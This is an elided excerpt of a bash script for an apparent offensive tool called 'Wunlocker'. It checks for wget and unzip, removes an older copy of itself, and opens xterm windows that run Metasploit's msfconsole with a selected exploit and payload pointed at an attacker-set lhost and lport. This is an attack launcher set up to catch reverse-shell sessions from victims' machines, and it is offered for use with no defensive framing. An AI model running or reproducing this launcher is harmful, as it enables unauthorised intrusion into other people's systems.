...
if [[ $select == 1 ]]; then
  # remove old version
  rm -f "${path}/Wunlocker" >/dev/null 2>&1
...
if [[ $select == 1 ]]; then
  ...
  if [[ $select == 1 ]]; then
    ...
    xterm -T " Wunlocker Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
    ...
    xterm -T " Wunlocker Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
  fi
...
# path= "info"
  ...
  command -v wget > /dev/null 2>&1 || { echo >&2 "${m}Wunlocker require wget but it's not installed. Install it. Aborting.${n}"; exit 1; }
  ...
  command -v unzip > /dev/null 2>&1 || { echo >&2 "${m}Wunlocker require unzip but it's not installed. Install it. Aborting.${n}"; exit 1; }
